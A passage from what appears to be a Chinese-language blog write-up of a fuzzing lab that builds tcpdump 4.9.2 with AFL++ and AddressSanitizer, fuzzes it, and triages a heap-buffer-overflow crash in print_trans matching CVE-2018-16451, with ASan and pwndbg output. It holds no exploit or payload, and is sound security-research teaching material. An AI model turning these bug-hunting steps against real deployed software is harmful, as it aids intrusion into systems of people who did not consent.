0800 2c54  @.A...........,T</span></span><br><span class="line"><span class="function">	0x0060:  2952 0017 f1a2 ce54 0000 0000 1778 0c00  )R.....T.....x..</span></span><br><span class="line"><span class="function">	0x0070:  0000 0000 1011 1213 1415 1617 1819 1a1b  ................</span></span><br><span class="line"><span class="function">	0x0080:  1c1d 1e1f 2021 2223 2425 2627 2829 2a2b  .....!&quot;#$%&amp;&#x27;<span class="params">()</span>*+</span></span><br><span class="line"><span class="function">	0x0090:  2c2d 2e2f 3031 3233 3435 3637            ,-./01234567</span></span><br><span class="line"><span class="function">06:04:33.817454 00:1b:21:3c:ac:30 &gt; 00:1b:21:3c:ab:64, ethertype <span class="title">IPv4</span> <span class="params">(<span class="number">0x0800</span>)</span>, length 148: <span class="params">(tos <span class="number">0x0</span>, ttl <span class="number">64</span>, id <span class="number">34821</span>, offset <span class="number">0</span>, flags [DF], proto UDP (<span class="number">17</span>), length <span class="number">134</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">......</span></span><br></pre></td></tr></table></figure>
<ul>
<li>和 wireshark 显示的结果大同小异</li>
</ul>
<h2 id="AddressSanitizer"><a href="#AddressSanitizer" class="headerlink" title="AddressSanitizer"></a>AddressSanitizer</h2><p><strong>AddressSanitizer (ASan)</strong> 是用于 C 和 C++ 的快速内存错误检测器</p>
<ul>
<li>它最初由 Google（Konstantin Serebryany、Derek Bruening、Alexander Potapenko、Dmitry Vyukov）开发，并于 2011 年 5 月首次发布</li>
<li>它由一个编译器检测模块和一个运行时库组成，该工具能够发现对堆、堆栈和全局对象的越界访问，以及释放后使用、双重释放和内存泄漏错误</li>
<li>AddressSanitizer 是开源的，从 3.1 版开始与 LLVM 编译器工具链集成，虽然它最初是作为 LLVM 项目开发的，但它已被移植到 GCC 并包含在 &gt;= 4.8 的 GCC 版本中</li>
</ul>
<p>现在我们将构建启用 ASAN 的 tcpdump（和 libpcap），首先，我们要清理所有以前编译的目标文件和可执行文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/libpcap-1.8.0/</span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line">cd $HOME/tcpdump-tcpdump-4.9.2/</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure>
<p>现在，我们在调用“configure”和“make”之前设置“AFL_USE_ASAN=1”：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/libpcap-1.8.0/</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_tcpdump/install/&quot;</span><br><span class="line">AFL_USE_ASAN=1 make</span><br><span class="line">AFL_USE_ASAN=1 make install</span><br><span class="line"></span><br><span class="line">cd $HOME/tcpdump-tcpdump-4.9.2/</span><br><span class="line">AFL_USE_ASAN=1 CC=afl-clang-lto ./configure --prefix=&quot;$HOME/fuzzing_tcpdump/install/&quot;</span><br><span class="line">AFL_USE_ASAN=1 make</span><br><span class="line">AFL_USE_ASAN=1 make install</span><br></pre></td></tr></table></figure>
<h2 id="Fuzz-TCPdump"><a href="#Fuzz-TCPdump" class="headerlink" title="Fuzz TCPdump"></a>Fuzz TCPdump</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -i $HOME/tcpdump-tcpdump-4.9.2/tests/ -o $HOME/fuzzing_tcpdump/out/ -s 123 -- $HOME/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r @@</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：64 位系统上的 ASAN 需要大量虚拟内存，需要设置了标志 “-m none” 来禁用 AFL 中的内存限制</li>
</ul>
<img src="/2022/08/16/Fuzz%20Lab3-TCPdump/1660639958590.png" class width="1660639958590"> 
<ul>
<li>PS：4小时，太慢了~~</li>
</ul>
<h2 id="Triage"><a href="#Triage" class="headerlink" title="Triage"></a>Triage</h2><p>调试使用 ASan 构建的程序比前面的练习要容易得多，您需要做的就是向程序提供崩溃文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r ./id:000000,sig:06,src:005014,time:6037115,execs:4952858,op:havoc,rep:16</span></span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">Warning: AFL++ tools might need to <span class="built_in">set</span> AFL_MAP_SIZE to <span class="number">84065</span> to be able to run <span class="keyword">this</span> instrumented program <span class="keyword">if</span> <span class="keyword">this</span> crashes!</span><br><span class="line">reading from file ./id:<span class="number">000000</span>,sig:<span class="number">06</span>,src:<span class="number">005014</span>,time:<span class="number">6037115</span>,execs:<span class="number">4952858</span>,op:havoc,rep:<span class="number">16</span>, link-<span class="function">type <span class="title">EN10MB</span> <span class="params">(Ethernet)</span></span></span><br><span class="line"><span class="function">04:27:12.000006 01:01:01:0d:01:01 &gt; ed:e9:ff:ff:ff:ff, ethertype <span class="title">IPv4</span> <span class="params">(<span class="number">0x0800</span>)</span>, length 67: truncated-ip - 2607 bytes missing! <span class="params">(tos <span class="number">0xe5</span>,ECT(<span class="number">1</span>), ttl <span class="number">252</span>, id <span class="number">8264</span>, offset <span class="number">0</span>, flags [none], proto UDP (<span class="number">17</span>), length <span class="number">2660</span>, bad cksum <span class="number">121</span> (-&gt;d6d1)!)</span></span></span><br><span class="line"><span class="function">    222.241.104.198.53 &gt; 131.63.241.146.67: 212 op8 ServFail|$ [41218q] q: <span class="title">Type212</span> <span class="params">(Class <span class="number">50098</span>)</span>? ., q:[|domain]</span></span><br><span class="line"><span class="function">	0x0000:  ede9 ffff ffff 0101 010d 0101 0800 45e5  ..............E.</span></span><br><span class="line"><span class="function">	0x0010:  0a64 2048 0000 fc11 0121 def1 68c6 833f  .d.H.....!..h..?</span></span><br><span class="line"><span class="function">	0x0020:  f192 0035 0043 1800 5002 00d4 c3b2 a102  ...5.C..P.......</span></span><br><span class="line"><span class="function">	0x0030:  0004 0000 0000 0000 d4c3 b2a1 0200 0400  ................</span></span><br><span class="line"><span class="function">	0x0040:  0000 0001 0000 0000 5d00 0000            ........]...</span></span><br><span class="line"><span class="function">08:01:59.1399853056 59:59:d4:c3:b2:a1 &gt; 00:00:00:00:00:71, 802.3, length 512: LLC, dsap <span class="title">SNA</span> <span class="params">(<span class="number">0x04</span>)</span> Individual, ssap <span class="title">Null</span> <span class="params">(<span class="number">0x00</span>)</span> Command, ctrl 0x0000: Information, send seq 0, rcv seq 0, Flags [Command], length 587271413</span></span><br><span class="line"><span class="function">	0x0000:  0000 0000 0071 5959 d4c3 b2a1 0200 0400  .....qYY........</span></span><br><span class="line"><span class="function">	0x0010:  0000 0000 0000 0000 ffff 0000 0100 0000  ................</span></span><br><span class="line"><span class="function">23:17:28.958610 00:04:23:57:a5:7a &gt; ff:ff:ff:ff:ef:ff, ethertype <span class="title">IPv4</span> <span class="params">(<span class="number">0x0800</span>)</span>, length 221: <span class="params">(tos <span class="number">0x0</span>, ttl <span class="number">128</span>, id <span class="number">14471</span>, offset <span class="number">0</span>, flags [none], proto UDP (<span class="number">17</span>), length <span class="number">207</span>)</span></span></span><br><span class="line"><span class="function">    192.168.1.249.138 &gt; 192.168.1.255.138: </span></span><br><span class="line"><span class="function">&gt;&gt;&gt; NBT UDP <span class="title">PACKET</span><span class="params">(<span class="number">138</span>)</span> Res</span>=<span class="number">0x110E</span> ID=<span class="number">0x891D</span> IP=<span class="number">192</span> (<span class="number">0xc0</span>)<span class="number">.168</span> (<span class="number">0xa8</span>)<span class="number">.1</span> (<span class="number">0x1</span>)<span class="number">.249</span> (<span class="number">0xf9</span>) Port=<span class="number">650</span> (<span class="number">0x28a</span>) Length=<span class="number">165</span> (<span class="number">0xa5</span>) Res2=<span class="number">0x0</span></span><br><span class="line">SourceName=DJP95S0J        NameType=<span class="number">0x00</span> (Workstation)</span><br><span class="line">DestName=ARBEITSGRUPPE   NameType=<span class="number">0x00</span> (Workstation)</span><br><span class="line"></span><br><span class="line">SMB PACKET: SMBtrans (REQUEST)</span><br><span class="line">SMB Command   =  <span class="number">0x25</span></span><br><span class="line">Error class   =  <span class="number">0x0</span></span><br><span class="line">Error code    =  <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">Flags1        =  <span class="number">0x0</span></span><br><span class="line">Flags2        =  <span class="number">0x0</span></span><br><span class="line">Tree ID       =  <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">Proc ID       =  <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">UID           =  <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">MID           =  <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">Word Count    =  <span class="number">17</span> (<span class="number">0x11</span>)</span><br><span class="line">TotParamCnt=<span class="number">0</span> (<span class="number">0x0</span>) </span><br><span class="line">TotDataCnt=<span class="number">11</span> (<span class="number">0xb</span>) </span><br><span class="line">MaxParmCnt=<span class="number">0</span> (<span class="number">0x0</span>) </span><br><span class="line">MaxDataCnt=<span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">MaxSCnt=<span class="number">0</span> (<span class="number">0x0</span>) </span><br><span class="line">TransFlags=<span class="number">0x0</span> </span><br><span class="line">Res1=<span class="number">0x3E9</span> </span><br><span class="line">Res2=<span class="number">0x0</span> </span><br><span class="line">Res3=<span class="number">0x0</span></span><br><span class="line">ParamCnt=<span class="number">0</span> (<span class="number">0x0</span>) </span><br><span class="line">ParamOff=<span class="number">0</span> (<span class="number">0x0</span>) </span><br><span class="line">DataCnt=<span class="number">11</span> (<span class="number">0xb</span>) </span><br><span class="line">DataOff=<span class="number">86</span> (<span class="number">0x56</span>) </span><br><span class="line">SUCnt=<span class="number">3</span> (<span class="number">0x3</span>)</span><br><span class="line">Data: (<span class="number">6</span> bytes)</span><br><span class="line">[<span class="number">000</span>] <span class="number">01</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span>                                 \<span class="number">0x01</span>\<span class="number">0x00</span>\<span class="number">0x01</span>\<span class="number">0x00</span>\<span class="number">0x02</span>\<span class="number">0x00</span> </span><br><span class="line">smb_bcc=<span class="number">28</span></span><br><span class="line">=================================================================</span><br><span class="line">==<span class="number">2727</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="number">0x611000000107</span> at pc <span class="number">0x0000003d0235</span> bp <span class="number">0x7ffc22dc8210</span> sp <span class="number">0x7ffc22dc79b8</span> <span class="comment">/* 对应代码的位置 */</span></span><br><span class="line">READ of size <span class="number">7</span> at <span class="number">0x611000000107</span> thread T0 <span class="comment">/* heap中的溢出点 */</span></span><br><span class="line">    #<span class="number">0</span> <span class="number">0x3d0234</span> in <span class="built_in">strcmp</span> (/home/yhellow/fuzzing_tcpdump/install/sbin/tcpdump+<span class="number">0x3d0234</span>)</span><br><span class="line">    #<span class="number">1</span> <span class="number">0x712469</span> in print_trans /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print-smb.c:<span class="number">375</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x713f6a</span> in print_smb /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print-smb.c:<span class="number">863</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x6ec5e1</span> in nbt_udp138_print /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print-smb.c:<span class="number">1307</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x6ec5e1</span> in udp_print /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print-udp.c:<span class="number">608</span>:<span class="number">4</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x55dfe8</span> in ip_print_demux /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print-ip.c:<span class="number">402</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x5616e5</span> in ip_print /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print-ip.c:<span class="number">673</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x51ac27</span> in ethertype_print /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print-ether.c:<span class="number">333</span>:<span class="number">10</span></span><br><span class="line">    #<span class="number">8</span> <span class="number">0x51996a</span> in ether_print /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print-ether.c:<span class="number">236</span>:<span class="number">7</span></span><br><span class="line">    #<span class="number">9</span> <span class="number">0x4791ab</span> in pretty_print_packet /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./print.c:<span class="number">332</span>:<span class="number">18</span></span><br><span class="line">    #<span class="number">10</span> <span class="number">0x4791ab</span> in print_packet /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./tcpdump.c:<span class="number">2497</span>:<span class="number">2</span></span><br><span class="line">    #<span class="number">11</span> <span class="number">0x83da5d</span> in pcap_offline_read /home/yhellow/libpcap<span class="number">-1.8</span><span class="number">.0</span>/./savefile.c:<span class="number">507</span>:<span class="number">4</span></span><br><span class="line">    #<span class="number">12</span> <span class="number">0x470c0c</span> in pcap_loop /home/yhellow/libpcap<span class="number">-1.8</span><span class="number">.0</span>/./pcap.c:<span class="number">875</span>:<span class="number">8</span></span><br><span class="line">    #<span class="number">13</span> <span class="number">0x470c0c</span> in main /home/yhellow/tcpdump-tcpdump<span class="number">-4.9</span><span class="number">.2</span>/./tcpdump.c:<span class="number">2000</span>:<span class="number">12</span></span><br><span class="line">    #<span class="number">14</span> <span class="number">0x7fa3263bb082</span> in __libc_start_main /build/glibc-SzIz7B/glibc<span class="number">-2.31</span>/csu/../csu/libc-start.c:<span class="number">308</span>:<span class="number">16</span></span><br><span class="line">    #<span class="number">15</span> <span class="number">0x3bcedd</span> in _start (/home/yhellow/fuzzing_tcpdump/install/sbin/tcpdump+<span class="number">0x3bcedd</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">0x611000000107</span> is located <span class="number">0</span> bytes to the right of <span class="number">199</span>-byte region [<span class="number">0x611000000040</span>,<span class="number">0x611000000107</span>)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x436f4d</span> in <span class="built_in">malloc</span> (/home/yhellow/fuzzing_tcpdump/install/sbin/tcpdump+<span class="number">0x436f4d</span>)</span><br><span class="line">    #<span class="number">1</span> <span class="number">0x83efd8</span> in pcap_check_header /home/yhellow/libpcap<span class="number">-1.8</span><span class="number">.0</span>/./sf-pcap.c:<span class="number">401</span>:<span class="number">14</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x83ce1d</span> in pcap_fopen_offline_with_tstamp_precision /home/yhellow/libpcap<span class="number">-1.8</span><span class="number">.0</span>/./savefile.c:<span class="number">380</span>:<span class="number">7</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x83cb48</span> in pcap_open_offline_with_tstamp_precision /home/yhellow/libpcap<span class="number">-1.8</span><span class="number">.0</span>/./savefile.c:<span class="number">287</span>:<span class="number">6</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/yhellow/fuzzing_tcpdump/install/sbin/tcpdump+<span class="number">0x3d0234</span>) in <span class="built_in">strcmp</span></span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c227fff7fd0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c227fff7fe0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c227fff7ff0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c227fff8000</span>: fa fa fa fa fa fa fa fa <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c227fff8010</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">=&gt;<span class="number">0x0c227fff8020</span>:[<span class="number">07</span>]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c227fff8030</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c227fff8040</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c227fff8050</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c227fff8060</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c227fff8070</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow byte legend (one shadow byte represents <span class="number">8</span> application bytes):</span><br><span class="line">  Addressable:           <span class="number">00</span></span><br><span class="line">  Partially addressable: <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after <span class="keyword">return</span>:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==<span class="number">2727</span>==ABORTING</span><br></pre></td></tr></table></figure>
<ul>
<li>程序 crash 的原因为 heap-buffer-overflow（堆溢出）</li>
</ul>
<p>[<strong>CVE-2017-13028</strong>] 的漏洞点是 <code>bootp_print()</code> ，而这里的漏洞点是 <code>print_trans()</code></p>
<p>后来发现这个是 <strong>[CVE-2018-16451]</strong> 的漏洞点，因为没有 fuzz 出 [<strong>CVE-2017-13028</strong>] 的漏洞，而我又不想继续 fuzz 了，干脆就复现 <strong>[CVE-2018-16451]</strong> 算了</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://avd.aliyun.com/detail?id=AVD-2018-16451">阿里云漏洞库 (aliyun.com)</a> </li>
</ul>
<h2 id="Reproduce-the-crash"><a href="#Reproduce-the-crash" class="headerlink" title="Reproduce the crash"></a>Reproduce the crash</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb --args ./tcpdump -vvvvXX -ee -nn -r ./test</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>print_trans</code> 打上断点，单步到执行 <code>strcmp</code> 的位置：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x712465</span> &lt;print_trans+<span class="number">1509</span>&gt;    call   <span class="built_in">strcmp</span>                      &lt;<span class="built_in">strcmp</span>&gt;</span><br><span class="line">       s1: <span class="number">0x611000000101</span> ◂— <span class="number">0x534c49414d5c</span> <span class="comment">/* &#x27;\\MAILS&#x27; */</span></span><br><span class="line">       s2: <span class="number">0x34e960</span> (str<span class="number">.275</span>) ◂— <span class="string">&#x27;\\MAILSLOT\\BROWSE&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>再次单步过后，ASan 检测到内存错误，并中断程序：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ni</span><br><span class="line">=================================================================</span><br><span class="line">==<span class="number">5418</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="number">0x611000000107</span> at pc <span class="number">0x0000003d0235</span> bp <span class="number">0x7fffffffbb30</span> sp <span class="number">0x7fffffffb2d8</span></span><br><span class="line">READ of size <span class="number">7</span> at <span class="number">0x611000000107</span> thread T0</span><br><span class="line">[Attaching after Thread <span class="number">0x7ffff7947800</span> (LWP <span class="number">5418</span>) fork to child process <span class="number">5422</span>]</span><br><span class="line">[New inferior <span class="number">2</span> (process <span class="number">5422</span>)]</span><br><span class="line">[Detaching after fork from parent process <span class="number">5418</span>]</span><br><span class="line">[Inferior <span class="number">1</span> (process <span class="number">5418</span>) detached]</span><br><span class="line">[Thread debugging <span class="keyword">using</span> libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">process <span class="number">5422</span> is executing <span class="keyword">new</span> program: /usr/lib/llvm<span class="number">-11</span>/bin/llvm-symbolizer</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint <span class="number">1.</span></span><br><span class="line">Cannot access memory at address <span class="number">0x712465</span></span><br></pre></td></tr></table></figure>
<ul>
<li>我第一时间不清楚 ASan 给出的报错信息和程序漏洞之间的关系，所以跟进 <code>strcmp</code> 继续调试</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x3d0252</span> &lt;<span class="built_in">strcmp</span>+<span class="number">482</span>&gt;    call   <span class="number">0x43c5c0</span>                      &lt;<span class="number">0x43c5c0</span>&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>一直跟进到 ASan 记录的地址：<code>0x3d0235</code>（我发现这个 <code>strcmp</code> 的地址有点怪，好像不在 libc 里面）</li>
<li>对比该汇编指令执行前后 [rdx] 寄存器的变化：（讲真，这里我没有看出溢出点）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*RDX  <span class="number">0x14</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffbb30</span> —▸ <span class="number">0x611000000101</span> ◂— <span class="number">0x534c49414d5c</span> <span class="comment">/* &#x27;\\MAILS&#x27; */</span></span><br><span class="line">*RIP  <span class="number">0x3d0235</span> (<span class="built_in">strcmp</span>+<span class="number">453</span>) ◂— lea    rdx, [rbp - <span class="number">0x858</span>]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► <span class="number">0x3d0235</span> &lt;<span class="built_in">strcmp</span>+<span class="number">453</span>&gt;    lea    rdx, [rbp - <span class="number">0x858</span>]</span><br><span class="line">   <span class="number">0x3d023c</span> &lt;<span class="built_in">strcmp</span>+<span class="number">460</span>&gt;    mov    rdi, rax</span><br><span class="line">   <span class="number">0x3d023f</span> &lt;<span class="built_in">strcmp</span>+<span class="number">463</span>&gt;    mov    rsi, qword ptr [rbp - <span class="number">0x40</span>]</span><br><span class="line">   <span class="number">0x3d0243</span> &lt;<span class="built_in">strcmp</span>+<span class="number">467</span>&gt;    mov    rcx, qword ptr [rbp - <span class="number">0x38</span>]</span><br><span class="line">   <span class="number">0x3d0247</span> &lt;<span class="built_in">strcmp</span>+<span class="number">471</span>&gt;    <span class="keyword">xor</span>    r8d, r8d</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*RDX  <span class="number">0x7fffffffb2d8</span> —▸ <span class="number">0x7ffff7b376a0</span> (_IO_2_1_stdout_) —▸ <span class="number">0xfbad2a84</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffbb30</span> —▸ <span class="number">0x611000000101</span> ◂— <span class="number">0x534c49414d5c</span> <span class="comment">/* &#x27;\\MAILS&#x27; */</span></span><br><span class="line">*RIP  <span class="number">0x3d023c</span> (<span class="built_in">strcmp</span>+<span class="number">460</span>) ◂— mov    rdi, rax</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x3d0235</span> &lt;<span class="built_in">strcmp</span>+<span class="number">453</span>&gt;    lea    rdx, [rbp - <span class="number">0x858</span>]</span><br><span class="line"> ► <span class="number">0x3d023c</span> &lt;<span class="built_in">strcmp</span>+<span class="number">460</span>&gt;    mov    rdi, rax</span><br><span class="line">   <span class="number">0x3d023f</span> &lt;<span class="built_in">strcmp</span>+<span class="number">463</span>&gt;    mov    rsi, qword ptr [rbp - <span class="number">0x40</span>]</span><br><span class="line">   <span class="number">0x3d0243</span> &lt;<span class="built_in">strcmp</span>+<span class="number">467</span>&gt;    mov    rcx, qword ptr [rbp - <span 